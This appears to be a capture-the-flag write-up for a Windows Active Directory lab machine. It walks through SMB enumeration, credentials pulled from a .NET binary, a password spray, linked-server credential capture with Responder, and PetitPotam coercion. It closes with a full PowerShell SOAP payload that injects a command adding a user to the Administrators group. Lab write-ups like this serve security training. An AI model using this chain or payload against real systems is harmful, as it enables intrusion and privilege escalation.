Overwatch Writeup

Author: atrox | Tags: Active Directory, WCF, MSSQL, PetitPotam, Unconstrained Delegation, SOAP Injection

Overview

Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.

The LDAP banner reveals the domain: overwatch.htb / host: S200401.

Reconnaissance

nmap -sV 10.129.16.26 -vvv

Enumeration

SMB — Anonymous Access

crackmapexec smb 10.129.16.26 -u guest -p '' --shares

Exploring the software$ share reveals a \Monitoring\ directory containing a .NET application: overwatch.exe.

WCF Service Discovery

The application configuration file reveals a WCF service endpoint usually filtered from external access:

<add baseAddress="http://overwatch.htb:8000/MonitorService" />

Credentials in the Binary

Running strings against overwatch.exe reveals a hardcoded SQL connection string:

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

User Enumeration & Password Spray

Using kerbrute for user enumeration and crackmapexec for a spray, we confirm several service accounts:

  • sqlsvc : TI0LKcfHzZw1Vv
  • svc_monitor : Overwatch2026!

Lateral Movement — Linked Server Credential Capture

After connecting to MSSQL as sqlsvc, we identify a linked server named SQL07. By adding a fake DNS record pointing SQL07 to our attack machine and running Responder, we capture cleartext credentials:

[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

Initial Foothold — WinRM

Using the captured credentials, we gain a shell as sqlmgmt via WinRM to collect the user flag.

Bonus: PetitPotam & Machine Account Hash

BloodHound reveals that the Domain Controller (S200401) has Unconstrained Delegation enabled. We can use PetitPotam to coerce authentication and capture the machine account hash.

Privilege Escalation — WCF SOAP Injection

The WCF service exposures a KillProcess method vulnerable to command injection. We send a crafted SOAP request from our WinRM session to add our user to the local Administrators group:

# PowerShell SOAP Injection Payload
iwr http://overwatch.htb:8000/MonitorService `
  -Method POST `
  -Headers @{ "SOAPAction" = '"http://tempuri.org/IMonitoringService/KillProcess"' } `
  -Body "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>
    <s:Body>
      <KillProcess xmlns='http://tempuri.org/'>
        <processName>notepad; net localgroup Administrators sqlmgmt /add</processName>
      </KillProcess>
    </s:Body>
  </s:Envelope>"
Attack Chain: SMB → SQL Creds → Linked Server Abuse → WinRM → WCF Injection → SYSTEM
